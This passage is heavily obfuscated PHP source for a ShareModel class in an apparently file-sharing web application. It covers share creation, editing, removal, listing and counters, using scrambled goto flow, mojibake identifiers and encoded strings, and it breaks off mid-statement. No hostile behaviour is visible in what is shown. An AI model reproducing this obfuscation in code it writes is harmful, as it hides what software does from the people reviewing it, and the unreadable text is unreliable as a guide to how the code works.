fileChart($D“ïÂëÌ†) { goto cÓˆâÃ£æº; CÛÄ†ÀÌ: $fäÍŠÂÊª[$AˆóïÑµ‘Ñ[401]] = 2; $fÆ‡æŠäÕ = Model($AˆóïÑµ‘Ñ[529])->where($fäÍŠÂÊª)->sum($AˆóïÑµ‘Ñ[86]); return array($AˆóïÑµ‘Ñ[463] => $E‰‚½Û°àÃ[$AˆóïÑµ‘Ñ[86]], $AˆóïÑµ‘Ñ[1476] => $E‰‚½Û°àÃ[$AˆóïÑµ‘Ñ[1476]], $AˆóïÑµ‘Ñ[1477] => (int) $e¶’‰µœ–, $AˆóïÑµ‘Ñ[1478] => (int) $fÆ‡æŠäÕ); goto A’£‘Å‘Ó; d¨Æ•³ø–¨: $E‰‚½Û°àÃ = $this->sourceSize(); $fäÍŠÂÊª = array($AˆóïÑµ‘Ñ[392] => 0, $AˆóïÑµ‘Ñ[401] => 1); $e¶’‰µœ– = Model($AˆóïÑµ‘Ñ[529])->where($fäÍŠÂÊª)->sum($AˆóïÑµ‘Ñ[86]); goto CÛÄ†ÀÌ; cÓˆâÃ£æº: $AˆóïÑµ‘Ñ =& $_SERVER[°Óó£ÌİóèÅ]; if (isset($D“ïÂëÌ†[$AˆóïÑµ‘Ñ[1095]])) { return Model($AˆóïÑµ‘Ñ[529])->userFileTypeProfile($D“ïÂëÌ†[$AˆóïÑµ‘Ñ[1095]]); } if (isset($D“ïÂëÌ†[$AˆóïÑµ‘Ñ[1546]])) { return Model($AˆóïÑµ‘Ñ[529])->groupFileTypeProfile($D“ïÂëÌ†[$AˆóïÑµ‘Ñ[1546]]); } goto d¨Æ•³ø–¨; A’£‘Å‘Ó: } private function sourceSize() { $FÁ†ÌÊÔƒ =& $_SERVER[°Óó£ÌİóèÅ]; $Bß‘×à¡‚‘ = Model($FÁ†ÌÊÔƒ[529])->where(array($FÁ†ÌÊÔƒ[383] => 0))->sum($FÁ†ÌÊÔƒ[86]); $D§åÒ±Ú›Å = Model($FÁ†ÌÊÔƒ[419])->sum($FÁ†ÌÊÔƒ[86]); if ($D§åÒ±Ú›Å > $Bß‘×à¡‚‘) { $D§åÒ±Ú›Å = $Bß‘×à¡‚‘; } return array($FÁ†ÌÊÔƒ[86] => (int) $Bß‘×à¡‚‘, $FÁ†ÌÊÔƒ[1476] => (int) $D§åÒ±Ú›Å); } } goto eÃÇôĞ¼•; cÈÛ¬æÓ›¨: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\162\x65"; protected $dataAuto = array(array("\x6d\157\144\x69\146\x79\124\151\x6d\145", "\164\x69\x6d\x65", "\151\156\x73\x65\162\164\54\x75\x70\x64\x61\x74\145", "\x66\165\156\143\x74\x69\157\x6e"), array("\143\x72\145\141\164\145\x54\151\x6d\x65", "\x74\x69\155\145", "\x69\x6e\163\x65\x72\x74", "\x66\165\x6e\x63\164\x69\x6f\156"), array("\157\160\164\x69\157\156\x73", '', "\151\156\x73\145\162\164\x2c\x75\x70\144\x61\164\x65\54\x73\x65\x6c\x65\143\164", "\x6a\163\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($F—‹¿ÄÎŞ›) { $b¸œ´Š±± =& $_SERVER[°Óó£ÌİóèÅ]; $aÚÉÖ•Œ‰ = isset($F—‹¿ÄÎŞ›[0]) ? $F—‹¿ÄÎŞ›[0] : !1; return array($b¸œ´Š±±[1657] => array(USER_ID, $b¸œ´Š±±[1658]), $b¸œ´Š±±[1624] => array($aÚÉÖ•Œ‰, $b¸œ´Š±±[1659])); } protected function listSimple() { $c›Ô¦†ß‹Ğ = array($_SERVER[°Óó£ÌİóèÅ][1095] => USER_ID); $AÌÁ¡‹»á = $this->field($this->fieldList)->where($c›Ô¦†ß‹Ğ)->select(); return $AÌÁ¡‹»á ? $AÌÁ¡‹»á : array(); } protected function getInfo($EÖ«Ñ¿ö¡ô, $aÄƒ¹—÷–Ú = false) { $fµ Ø–Š§± =& $_SERVER[°Óó£ÌİóèÅ]; if ($aÄƒ¹—÷–Ú) { return $this->_getShareInfo(array($fµ Ø–Š§±[427] => $EÖ«Ñ¿ö¡ô)); } $câé®¥»¥ = $this->cacheFunctionGet($fµ Ø–Š§±[1660], $EÖ«Ñ¿ö¡ô); return $câé®¥»¥; } public function getInfoByHash($b“÷·Ü‹Ï) { return $this->_getShareInfo(array($_SERVER[°Óó£ÌİóèÅ][1661] => $b“÷·Ü‹Ï)); } public function getInfoByPath($DÛæŞÎõ«¢) { $bˆæöÃğ– =& $_SERVER[°Óó£ÌİóèÅ]; $e÷šµÄ×Ù» = array($bˆæöÃğ–[1095] => USER_ID, $bˆæöÃğ–[382] => $DÛæŞÎõ«¢); return $this->_getShareInfo($e÷šµÄ×Ù»); } public function getInfoBySourcePath($e¿ÜÀÂÉóì) { $fÊÎÉŒ÷©„ =& $_SERVER[°Óó£ÌİóèÅ]; $bšÇòÉÕ—™ = array($fÊÎÉŒ÷©„[1095] => USER_ID, $fÊÎÉŒ÷©„[764] => $e¿ÜÀÂÉóì); return $this->_getShareInfo($bšÇòÉÕ—™); } private function _getShareInfo($Bóë“›¾†©) { goto FÂ¦Ûœµ‡Ğ; FÂ¦Ûœµ‡Ğ: $DÒÈî­Óìš =& $_SERVER[°Óó£ÌİóèÅ]; $AÉ³ùŞ•Ñ = $this->where($Bóë“›¾†©)->find(); if (!$AÉ³ùŞ•Ñ) { return !1; } goto AìÁ»¸àÚ; AìÁ»¸àÚ: $Bóë“›¾†© = array($DÒÈî­Óìš[427] => $AÉ³ùŞ•Ñ[$DÒÈî­Óìš[427]]); $a‘–‰Ô°å = $DÒÈî­Óìš[1662]; $C…Šµ„¨»î = Model($DÒÈî­Óìš[428])->order($DÒÈî­Óìš[376])->field($a‘–‰Ô°å)->where($Bóë“›¾†©)->select(); goto FØ”¸Ã©š›; FØ”¸Ã©š›: if ($AÉ³ùŞ•Ñ[$DÒÈî­Óìš[382]] == $DÒÈî­Óìš[410]) { $AÉ³ùŞ•Ñ[$DÒÈî­Óìš[858]] = IO::info($AÉ³ùŞ•Ñ[$DÒÈî­Óìš[764]]); } else { $AÉ³ùŞ•Ñ[$DÒÈî­Óìš[858]] = Model($DÒÈî­Óìš[852])->pathInfo($AÉ³ùŞ•Ñ[$DÒÈî­Óìš[382]]); } $AÉ³ùŞ•Ñ[$DÒÈî­Óìš[1663]] = $C…Šµ„¨»î; return $AÉ³ùŞ•Ñ; goto d£½ïğ‡Ğº; d£½ïğ‡Ğº: } protected function getInfoAuth($dèÏÖ§‰ÂÎ) { $eøÑ…çß«Œ =& $_SERVER[°Óó£ÌİóèÅ]; $D…Ø×àŠ = $this->getInfo($dèÏÖ§‰ÂÎ); $D…Ø×àŠ[$eøÑ…çß«Œ[557]] = Model($eøÑ…çß«Œ[421])->authMake($D…Ø×àŠ[$eøÑ…çß«Œ[1663]]); return $D…Ø×àŠ; } protected function listData($eŠ¹êÆâ = null, $fãİùÜ‰Œ = 300) { $d¶õÍ¸ğæì =& $_SERVER[°Óó£ÌİóèÅ]; $bº‚ÂÆñ¬ = array(array($d¶õÍ¸ğæì[1664] => array($d¶õÍ¸ğæì[693], 0), $d¶õÍ¸ğæì[425] => array($d¶õÍ¸ğæì[693], 0), $d¶õÍ¸ğæì[1665] => $d¶õÍ¸ğæì[1639])); if ($eŠ¹êÆâ == $d¶õÍ¸ğæì[1297]) { $bº‚ÂÆñ¬ = array($d¶õÍ¸ğæì[1664] => 1); } else { if ($eŠ¹êÆâ == $d¶õÍ¸ğæì[753]) { $bº‚ÂÆñ¬ = array($d¶õÍ¸ğæì[425] => 1); } } $bº‚ÂÆñ¬[$d¶õÍ¸ğæì[1095]] = USER_ID; $Fò„¤…áìã = $this->where($bº‚ÂÆñ¬)->selectPage($fãİùÜ‰Œ); return $Fò„¤…áìã; } protected function listToMe($B±Š‚ÔÒœ = 300) { goto f„¢ä¤á›; f×‡Àö”ÛØ: $A’³¥Â®©Š = array($Aê²Ø†›¢[427] => array($Aê²Ø†›¢[563], array_keys($Aæ†ÕÏ©¼Œ))); $DÔ¹”èïâÚ = $this->field($fµ¶»ñ”Ñ×)->where($A’³¥Â®©Š)->select(); foreach ($DÔ¹”èïâÚ as $fƒÊ¯³£ÎÍ => &$AÊ¨…ÖõÌ) { $AÊ¨…ÖõÌ[$Aê²Ø†›¢[1663]] = $Aæ†ÕÏ©¼Œ[$AÊ¨…ÖõÌ[$Aê²Ø†›¢[427]]]; } goto Bï—…áÔÂ; eÎŠã¸á¡‚: $A’³¥Â®©Š = array($Aê²Ø†›¢[400] => SourceModel::TYPE_USER, $Aê²Ø†›¢[403] => USER_ID); if ($f‹Ñá™Ã¦Õ) { $A’³¥Â®©Š = array(array($Aê²Ø†›¢[400] => SourceModel::TYPE_USER, $Aê²Ø†›¢[403] => USER_ID), array($Aê²Ø†›¢[400] => SourceModel::TYPE_GROUP, $Aê²Ø†›¢[403] => array($Aê²Ø†›¢[7], $f‹Ñá™Ã¦Õ)), $Aê²Ø†›¢[1665] => $Aê²Ø†›¢[1639]); } $aÊ¨ëã¦’ = Model($Aê²Ø†›¢[428])->where($A’³¥Â®©Š)->selectPage($B±Š‚ÔÒœ); goto bß©ŒĞ‰ ; bß©ŒĞ‰ : $Aæ†ÕÏ©¼Œ = array_to_keyvalue_group($aÊ¨ëã¦’[$Aê²Ø†›¢[364]], $Aê²Ø†›¢[427]); if (!$Aæ†ÕÏ©¼Œ) { return $aÊ¨ëã¦’; } $fµ¶»ñ”Ñ× = $Aê²Ø†›¢[1667]; goto f×‡Àö”ÛØ; f„¢ä¤á›: $Aê²Ø†›¢ =& $_SERVER[°Óó£ÌİóèÅ]; $c®àè×ƒİ¢ = Session::get($Aê²Ø†›¢[1666]); $f‹Ñá™Ã¦Õ = array_to_keyvalue($c®àè×ƒİ¢, $Aê²Ø†›¢[33], $Aê²Ø†›¢[1546]); goto eÎŠã¸á¡‚; Bï—…áÔÂ: $Fš³¿ºÆ· = array($Aê²Ø†›¢[1668] => $DÔ¹”èïâÚ, $Aê²Ø†›¢[1669] => $aÊ¨ëã¦’[$Aê²Ø†›¢[361]]); return $Fš³¿ºÆ·; goto F±Í©¢†è…; F±Í©¢†è…: } protected function shareAdd($AÅÀÊì„‘, $FƒÂ¼İ¯»‘) { $fİŒÈÛĞ‹ =& $_SERVER[°Óó£ÌİóèÅ]; $C» ÒŒº = $this->_addShareData($AÅÀÊì„‘, $FƒÂ¼İ¯»‘); if (isset($FƒÂ¼İ¯»‘[$fİŒÈÛĞ‹[1670]]) && count($FƒÂ¼İ¯»‘[$fİŒÈÛĞ‹[1670]]) > 0) { $this->_shareAuthSet($C» ÒŒº, $FƒÂ¼İ¯»‘[$fİŒÈÛĞ‹[1670]]); } $this->shareEventAdd($AÅÀÊì„‘, $FƒÂ¼İ¯»‘, $fİŒÈÛĞ‹[756]); return $C» ÒŒº; } private function shareEventAdd($Cº°¢À”›±, $f÷÷’Ã…†Á, $D¤ƒ‹¡Õ‰ = "\141\x64\144") { goto d¡ÃÉà™†š; d¡ÃÉà™†š: $d¼©áÚêÔ =& $_SERVER[°Óó£ÌİóèÅ]; if ($D¤ƒ‹¡Õ‰ == $d¼©áÚêÔ[756]) { if ($f÷÷’Ã…†Á[$d¼©áÚêÔ[1664]] == $d¼©áÚêÔ[384]) { Model($d¼©áÚêÔ[389])->eventShare($Cº°¢À”›±, $d¼©áÚêÔ[1671]); } if ($f÷÷’Ã…†Á[$d¼©áÚêÔ[425]] == $d¼©áÚêÔ[384]) { Model($d¼©áÚêÔ[389])->eventShare($Cº°¢À”›±, $d¼©áÚêÔ[1672]); } return; } $cÌåºâ¦â÷ = $this->getInfoByPath($Cº°¢À”›±); goto CÙğë¶Ô™Ç; CÙğë¶Ô™Ç: $eÁç¿’§™Ã = $d¼©áÚêÔ[1673]; if ($cÌåºâ¦â÷[$d¼©áÚêÔ[1664]] == $d¼©áÚêÔ[410] && $f÷÷’Ã…†Á[$d¼©áÚêÔ[1664]] == $d¼©áÚêÔ[384]) { $eÁç¿’§™Ã = $d¼©áÚêÔ[1671]; } if ($cÌåºâ¦â÷[$d¼©áÚêÔ[1664]] == $d¼©áÚêÔ[384] && $f÷÷’Ã…†Á[$d¼©áÚêÔ[1664]] == $d¼©áÚêÔ[410]) { $eÁç¿’§™Ã = $d¼©áÚêÔ[1674]; } goto c­Œ“•»¬; c­Œ“•»¬: if ($cÌåºâ¦â÷[$d¼©áÚêÔ[425]] == $d¼©áÚêÔ[410] && $f÷÷’Ã…†Á[$d¼©áÚêÔ[425]] == $d¼©áÚêÔ[384]) { $eÁç¿’§™Ã = $d¼©áÚêÔ[1672]; } if ($cÌåºâ¦â÷[$d¼©áÚêÔ[425]] == $d¼©áÚêÔ[384] && $f÷÷’Ã…†Á[$d¼©áÚêÔ[425]] == $d¼©áÚêÔ[410]) { $eÁç¿’§™Ã = $d¼©áÚêÔ[1675]; } Model($d¼©áÚêÔ[389])->eventShare($Cº°¢À”›±, $eÁç¿’§™Ã); goto BŒ–Ù»Âó÷; BŒ–Ù»Âó÷: return; goto E™ã–ÒĞ; E™ã–ÒĞ: } private function _addShareData($eïéØğ”Ğ, $bé†³ÜÎ¾ = array()) { goto dÏ¯¶Ï”„—; AàÈšËìË: $dÚÓ§”¦ÜÑ = $this->add($aŠ†¢„Àº); $fĞè´ãÈŸ = array($D‹‡ä„çÄ¤[1661] => short_id($dÚÓ§”¦ÜÑ)); $this->where(array($D‹‡ä„çÄ¤[1681] => $dÚÓ§”¦ÜÑ))->save($fĞè´ãÈŸ); goto dÏŠÉ©µÂ¨; D×±Œ÷¿‘¸: $aŠ†¢„Àº = array($D‹‡ä„çÄ¤[1086] => USER_ID, $D‹‡ä„çÄ¤[423] => $eïéØğ”Ğ, $D‹‡ä„çÄ¤[1001] => $D‹‡ä„çÄ¤[33], $D‹‡ä„çÄ¤[1664] => 0, $D‹‡ä„çÄ¤[425] => 0, $D‹‡ä„çÄ¤[764] => $D‹‡ä„çÄ¤[33], $D‹‡ä„çÄ¤[568] => $D‹‡ä„çÄ¤[33], $D‹‡ä„çÄ¤[1677] => 0, $D‹‡ä„çÄ¤[1678] => 0, $D‹‡ä„çÄ¤[468] => 0, $D‹‡ä„çÄ¤[1679] => $D‹‡ä„çÄ¤[33], $D‹‡ä„çÄ¤[1661] => $D‹‡ä„çÄ¤[33]); $a±ï…·‹„ = explode($D‹‡ä„çÄ¤[47], $D‹‡ä„çÄ¤[1680]); foreach ($a±ï…·‹„ as $cµ‰ŒĞ§Ô) { $aŠ†¢„Àº[$cµ‰ŒĞ§Ô] = $bé†³ÜÎ¾[$cµ‰ŒĞ§Ô]; } goto AàÈšËìË; EâØ«®—: if ($cŸÑå»—¶Â = $this->where($D—¯ß›ôë)->find()) { return $cŸÑå»—¶Â[$D‹‡ä„çÄ¤[427]]; } if ($eïéØğ”Ğ == 0) { $aºê½Ì¼ç¬ = array($D‹‡ä„çÄ¤[28] => get_path_this($bé†³ÜÎ¾[$D‹‡ä„çÄ¤[84]])); } else { $aºê½Ì¼ç¬ = Model($D‹‡ä„çÄ¤[529])->sourceInfo($eïéØğ”Ğ); if (!$aºê½Ì¼ç¬) { return !1; } } if (!$bé†³ÜÎ¾[$D‹‡ä„çÄ¤[1001]]) { $bé†³ÜÎ¾[$D‹‡ä„çÄ¤[1001]] = $aºê½Ì¼ç¬[$D‹‡ä„çÄ¤[28]]; } goto D×±Œ÷¿‘¸; dÏ¯¶Ï”„—: $D‹‡ä„çÄ¤ =& $_SERVER[°Óó£ÌİóèÅ]; $D—¯ß›ôë = array($D‹‡ä„çÄ¤[423] => $eïéØğ”Ğ, $D‹‡ä„çÄ¤[1086] => USER_ID); if ($eïéØğ”Ğ == 0) { $D—¯ß›ôë = array($D‹‡ä„çÄ¤[1676] => $bé†³ÜÎ¾[$D‹‡ä„çÄ¤[764]], $D‹‡ä„çÄ¤[1086] => USER_ID); } goto EâØ«®—; dÏŠÉ©µÂ¨: return $dÚÓ§”¦ÜÑ; goto e¦ßèï¡ÑË; e¦ßèï¡ÑË: } private function _shareAuthSet($aİ½¦ªåÎ©, $D‰Ä–…ÂÌ) { goto Eˆö·…Úãã; f¢¿ƒæÔ: $eíÀ‚ğ¶‰->where(array($BïñÕµ‘[427] => $aİ½¦ªåÎ©))->delete(); $c©±‘÷¡Ö‡ = array(); foreach ($D‰Ä–…ÂÌ as $D¹æà¿½¶) { $cÉÑ®ö×ÙŠ = SourceModel::TYPE_USER; if ($D¹æà¿½¶[$BïñÕµ‘[401]] == SourceModel::TYPE_GROUP) { $cÉÑ®ö×ÙŠ = SourceModel::TYPE_GROUP; } $dŠ¾É’˜ï = array($BïñÕµ‘[427] => $aİ½¦ªåÎ©, $BïñÕµ‘[401] => $cÉÑ®ö×ÙŠ, $BïñÕµ‘[403] => intval($D¹æà¿½¶[$BïñÕµ‘[403]]), $BïñÕµ‘[1683] => 0, $BïñÕµ‘[1684] => -1); if ($D¹æà¿½¶[$BïñÕµ‘[1683]]) { $dŠ¾É’˜ï[$BïñÕµ‘[1683]] = $D¹æà¿½¶[$BïñÕµ‘[1683]]; } else { if ($D¹æà¿½¶[$BïñÕµ‘[1684]]) { $dŠ¾É’˜ï[$BïñÕµ‘[1684]] = $D¹æà¿½¶[$BïñÕµ‘[1684]]; } } $c©±‘÷¡Ö‡[] = $dŠ¾É’˜ï; } goto f„±£òùğ; f„±£òùğ: return $eíÀ‚ğ¶‰->addAll($c©±‘÷¡Ö‡, array(), !0); goto B…ø³›à»¾; Eˆö·…Úãã: $BïñÕµ‘ =& $_SERVER[°Óó£ÌİóèÅ]; if (!is_array($D‰Ä–…ÂÌ)) { return !1; } $eíÀ‚ğ¶‰ = Model($BïñÕµ‘[1682]); goto f¢¿ƒæÔ; B…ø³›à»¾: } public function numViewAdd($a˜Éö¤ÏË) { $Dµ‹½Üß¨ä =& $_SERVER[°Óó£ÌİóèÅ]; $cá©ÑÖÂ‡İ = array($Dµ‹½Üß¨ä[1681] => $a˜Éö¤ÏË); $this->where($cá©ÑÖÂ‡İ)->setAdd($Dµ‹½Üß¨ä[1677]); } public function numDownloadAdd($fíØø¹ªÄÀ) { $D¬–ÁÈŠ¡ì =& $_SERVER[°Óó£ÌİóèÅ]; $E—“­¼İ– = array($D¬–ÁÈŠ¡ì[1681] => $fíØø¹ªÄÀ); $this->where($E—“­¼İ–)->setAdd($D¬–ÁÈŠ¡ì[1678]); } protected function shareEdit($AÕ¤×‹İ–†, $DÊª¢º‚Š) { goto BØóÇòĞ‚Õ; få¿²„‹Ñ: if (isset($DÊª¢º‚Š[$a¿¨†Ü‚˜[1670]])) { $this->_shareAuthSet($AÕ¤×‹İ–†, $DÊª¢º‚Š[$a¿¨†Ü‚˜[1670]]); } return !0; goto F´º¼¦ƒË; BØóÇòĞ‚Õ: $a¿¨†Ü‚˜ =& $_SERVER[°Óó£ÌİóèÅ]; $eŠ¦ƒÖğ°¿ = $this->getInfo($AÕ¤×‹İ–†); if (!$eŠ¦ƒÖğ°¿) { return !1; } goto fÆ×¹‹Èù£; eçÁ—äË˜: foreach ($A§ó‚ÀÁ¸… as $Aô…Î ¼Ø) { if (!array_key_exists($Aô…Î ¼Ø, $DÊª¢º‚Š)) { continue; } $e±à™ù‹Ä[$Aô…Î ¼Ø] = $DÊª¢º‚Š[$Aô…Î ¼Ø]; } $this->shareEventAdd($eŠ¦ƒÖğ°¿[$a¿¨†Ü‚˜[382]], $DÊª¢º‚Š, $a¿¨†Ü‚˜[1515]); $this->where(array($a¿¨†Ü‚˜[1681] => $AÕ¤×‹İ–†))->save($e±à™ù‹Ä); goto få¿²„‹Ñ; fÆ×¹‹Èù£: $this->_checkLinkShare($DÊª¢º‚Š, $eŠ¦ƒÖğ°¿); $e±à™ù‹Ä = array(); $A§ó‚ÀÁ¸… = explode($a¿¨†Ü‚˜[47], $a¿¨†Ü‚˜[1685]); goto eçÁ—äË˜; F´º¼¦ƒË: } private function _checkLinkShare($Fâ¡øßÆ, $Dó¼ˆ¬ğĞƒ) { $eÌò¯„Ô½ =& $_SERVER[°Óó£ÌİóèÅ]; if ($Fâ¡øßÆ[$eÌò¯„Ô½[1664]] != $eÌò¯„Ô½[384] || $Dó¼ˆ¬ğĞƒ[$eÌò¯„Ô½[858]][$eÌò¯„Ô½[29]] != $eÌò¯„Ô½[172]) { return; } $c…Æ¹íî = Model($eÌò¯„Ô½[529])->fileInfoGet($Dó¼ˆ¬ğĞƒ[$eÌò¯„Ô½[858]][$eÌò¯„Ô½[382]]); if (!$c…Æ¹íî) { return; } $eçÂÀÊ“Ñ• = $this->shareFileMeta($c…Æ¹íî[$eÌò¯„Ô½[390]]); if (isset($eçÂÀÊ“Ñ•[$eÌò¯„Ô½[367]]) && $eçÂÀÊ“Ñ•[$eÌò¯„Ô½[367]] == $eÌò¯„Ô½[384]) { show_json(LNG($eÌò¯„Ô½[1686]), !1); } } protected function remove($bÛ¯‚½éÛ) { goto DÉ«öÉ®ÅÏ; DÉ«öÉ®ÅÏ: $f‘™Æ×Ì› =& $_SERVER[°Óó£ÌİóèÅ]; if (is_array($bÛ¯‚½éÛ)) { $bÛ¯‚½éÛ = array($f‘™Æ×Ì›[7], $bÛ¯‚½éÛ); } $Eö³Òª‡“  = array($f‘™Æ×Ì›[427] => $bÛ¯‚½éÛ); goto E†—®ê­Ô; E†—®ê­Ô: $dÎ“¢ƒƒ˜« = $this->where($Eö³Òª‡“ )->delete(); if ($dÎ“¢ƒƒ˜«) { Model($f‘™Æ×Ì›[428])->where(array($f‘™Æ×Ì›[427] => $bÛ¯‚½éÛ))->delete(); } $F¡ò¨ˆÎíÂ = is_array($bÛ¯‚½éÛ) ? $bÛ¯‚½éÛ[1] : array($bÛ¯‚½éÛ); goto cÜ…¨âËˆ¸; cÜ…¨âËˆ¸: for ($e¨´À–®ÜÁ = 0; $e¨´À–®ÜÁ < count($F¡ò¨ˆÎíÂ); $e¨´À–®ÜÁ++) { $F”…™Œ‹Šó = $this->getInfo($F¡ò¨ˆÎíÂ[$e¨´À–®ÜÁ]); if ($F”…™Œ‹Šó[$f‘™Æ×Ì›[425]] == $f‘™Æ×Ì›[384]) { Model($f‘™Æ×Ì›[389])->eventShare($F”…™Œ‹Šó[$f‘™Æ×Ì›[382]], $f‘™Æ×Ì›[1675]); } if ($F”…™Œ‹Šó[$f‘™Æ×Ì›[1664]] == $f‘™Æ×Ì›[384]) { Model($f‘™Æ×Ì›[389])->eventShare($F”…™Œ‹Šó[$f‘™Æ×Ì›[382]], $f‘™Æ×Ì›[1674]); } } return $dÎ“¢ƒƒ˜«; goto FÆ··ö¶¬; FÆ··ö¶¬: } protected function removeBySource($c‰Íòºáˆ) { goto dÛ”’¤°é; c¡ê±–ãÓ: $this->where($Fª‡ÄêöÓ´)->delete(); Model($fÂØÌ±æ®[428])->where($Fª‡ÄêöÓ´)->delete(); goto A²˜—âÇ¸; dÛ”’¤°é: $fÂØÌ±æ® =& $_SERVER[°Óó£ÌİóèÅ]; $Fª‡ÄêöÓ´ = array($fÂØÌ±æ®[423] => array($fÂØÌ±æ®[563], $c‰Íòºáˆ)); $E½ÀµÈŞ™ˆ = $this->field($fÂØÌ±æ®[427])->where($Fª‡ÄêöÓ´)->select(); goto F”ó¤§¦´; F”ó¤§¦´: $E½ÀµÈŞ™ˆ = array_to_keyvalue($E½ÀµÈŞ™ˆ, $fÂØÌ±æ®[33], $fÂØÌ±æ®[427]); if (!$E½ÀµÈŞ™ˆ) { return; } $Fª‡ÄêöÓ´ = array($fÂØÌ±æ®[1681] => array($fÂØÌ±æ®[563], $E½ÀµÈŞ™ˆ)); goto c¡ê±–ãÓ; A²˜—âÇ¸: } public function listAll($F‡°²¦½¹Ô) { goto Fƒ©âÔ³İÜ; c²ãÓÙ˜†˜: return $b¾ë¸ÊÆ¯ğ; goto e¿ãæ´ÁõŸ; Fƒ©âÔ³İÜ: $CÃà©»ïÏ =& $_SERVER[°Óó£ÌİóèÅ]; $cíç­æŠÂÚ = array(); if ($F‡°²¦½¹Ô[$CÃà©»ïÏ[1095]]) { $cíç­æŠÂÚ[$CÃà©»ïÏ[1095]] = $F‡°²¦½¹Ô[$CÃà©»ïÏ[1095]]; } goto F–ƒÊæ¸ù•; F–ƒÊæ¸ù•: if ($F‡°²¦½¹Ô[$CÃà©»ïÏ[467]]) { $fºĞ¾›ˆ¤¸ = $F‡°²¦½¹Ô[$CÃà©»ïÏ[468]] ? $F‡°²¦½¹Ô[$CÃà©»ïÏ[468]] : strtotime(date($CÃà©»ïÏ[1687])); $cíç­æŠÂÚ[$CÃà©»ïÏ[195]] = array($CÃà©»ïÏ[332], array($F‡°²¦½¹Ô[$CÃà©»ïÏ[467]], $fºĞ¾›ˆ¤¸)); } if ($F‡°²¦½¹Ô[$CÃà©»ïÏ[29]]) { $cíç­æŠÂÚ[$F‡°²¦½¹Ô[$CÃà©»ïÏ[29]]] = 1; } else { $cíç­æŠÂÚ[] = array($CÃà©»ïÏ[1664] => array($CÃà©»ïÏ[693], 0), $CÃà©»ïÏ[425] => array($CÃà©»ïÏ[693], 0), $CÃà©»ïÏ[1665] => $CÃà©»ïÏ[1639]); } if ($F‡°²¦½¹Ô[$CÃà©»ïÏ[1635]]) { $cíç­æŠÂÚ[] = array($CÃà©»ïÏ[1661] => $F‡°²¦½¹Ô[$CÃà©»ïÏ[1635]], $CÃà©»ïÏ[1001] => array($CÃà©»ïÏ[528], "\x25{$F‡°²¦½¹Ô[$CÃà©»ïÏ[1635]]}\x25"), $CÃà©»ïÏ[1665] => $CÃà©»ïÏ[1639]); } goto Eí·Ã‰÷Éâ; Eí·Ã‰÷Éâ: $b¾ë¸ÊÆ¯ğ = $this->_makeOrder()->where($cíç­æŠÂÚ)->selectPage(20); if (empty($b¾ë¸ÊÆ¯ğ[$CÃà©»ïÏ[364]])) { return array(); } $this->_listDataApply($b¾ë¸ÊÆ¯ğ[$CÃà©»ïÏ[364]]); goto c²ãÓÙ˜†˜; e¿ãæ´ÁõŸ: } private function _listDataApply(&$eƒõÀŸ•³Ä) { $Bí×ô§£ =& $_SERVER[°Óó£ÌİóèÅ]; $CÆ©Ë¢èàò = array_to_keyvalue($eƒõÀŸ•³Ä, $Bí×ô§£[33], $Bí×ô§£[1095]); $d³Ş°‰Ö‹Ò = Model($Bí×ô§£[1481])->userListInfo(array_unique($CÆ©Ë¢èàò)); $CÆä‘·‚ÉÅ = array_to_keyvalue($eƒõÀŸ•³Ä, $Bí×ô§£[33], $Bí×ô§£[382]); $CÎ¦Öçìá¯ = Model($Bí×ô§£[529])->sourceListInfo($CÆä‘·‚ÉÅ, !0); foreach ($eƒõÀŸ•³Ä as &$Dá‹ˆ„“ùË) { $a®½è¹°‰à = $Dá‹ˆ„“ùË[$Bí×ô§£[1095]]; $Dá‹ˆ„“ùË[$Bí×ô§£[1688]] = $d³Ş°‰Ö‹Ò[$a®½è¹°‰à] ? $d³Ş°‰Ö‹Ò[$a®½è¹°‰à] : !1; $bË®›…ì×ã = $Dá‹ˆ„“ùË[$Bí×ô§£[382]]; $Dá‹ˆ„“ùË[$Bí×ô§£[858]] = $CÎ¦Öçìá¯[$bË®›…ì×ã] ? $CÎ¦Öçìá¯[$bË®›…ì×ã] : !1; } } private function _makeOrder($bí±áìÊò¤ = '') { goto b–èçÌ³İ; b–èçÌ³İ: $a­µ¹ğ«Î» =& $_SERVER[°Óó£ÌİóèÅ]; $f¯„÷´¤º = array($a­µ¹ğ«Î»[195], $a­µ¹ğ«Î»[468], $a­µ¹ğ«Î»[1677], $a­µ¹ğ«Î»[1678]); $fñÆÇ²¢‘‚ = array($a­µ¹ğ«Î»[1632] => $a­µ¹ğ«Î»[1633], $a­µ¹ğ«Î»[1513] => $a­µ¹ğ«Î»[1590]); goto Eš³™Õ‚¸‘; D”Š†Æ±†ˆ: $bí±áìÊò¤ = $bí±áìÊò¤ . "{$Aˆ‡Â×ï¹›}\40{$a²Š˜ÕÅÔŠ}"; return $this->order($bí±áìÊò¤); goto c´ÏÀÂÈ›ˆ; Eš³™Õ‚¸‘: $Aˆ‡Â×ï¹› = Input::get($a­µ¹ğ«Î»[1586], $a­µ¹ğ«Î»[7], $a­µ¹ğ«Î»[1587], $f¯„÷´¤º); $a²Š˜ÕÅÔŠ = Input::get($a­µ¹ğ«Î»[1588], $a­µ¹ğ«Î»[7], $a­µ¹ğ«Î»[1689], array($a­µ¹ğ«Î»[1634], $a­µ¹ğ«Î»[1513])); $a²Š˜ÕÅÔŠ = $fñÆÇ²¢‘‚[$a²Š˜ÕÅÔŠ]; goto D”Š†Æ±†ˆ; c´ÏÀÂÈ›ˆ: } public function reportAdd($f©ù×Š¤–Õ) { $Bã—’Ã³Ó• =& $_SERVER[°Óó£ÌİóèÅ]; $C„Íˆ©¡› = array($Bã—’Ã³Ó•[427] => $f©ù×Š¤–Õ[$Bã—’Ã³Ó•[427]], $Bã—’Ã³Ó•[1095] => USER_ID); if (Model($Bã—’Ã³Ó•[1690])->where($C„Íˆ©¡›)->find()) { return !1; } $dôŸîĞ¯à± = array($Bã—’Ã³Ó•[427] => $f©ù×Š¤–Õ[$Bã—’Ã³Ó•[427]], $Bã—’Ã³Ó•[1001] => $f©ù×Š¤–Õ[$Bã—’Ã³Ó•[1001]], $Bã—’Ã³Ó•[382] => $f©ù×Š¤–Õ[$Bã—’Ã³Ó•[382]], $Bã—’Ã³Ó•[390] => $f©ù×Š¤–Õ[$Bã—’Ã³Ó•[390]], $Bã—’Ã³Ó•[1095] => USER_ID, $Bã—’Ã³Ó•[29] => $f©ù×Š¤–Õ[$Bã—’Ã³Ó•[29]], $Bã—’Ã³Ó•[1590] => 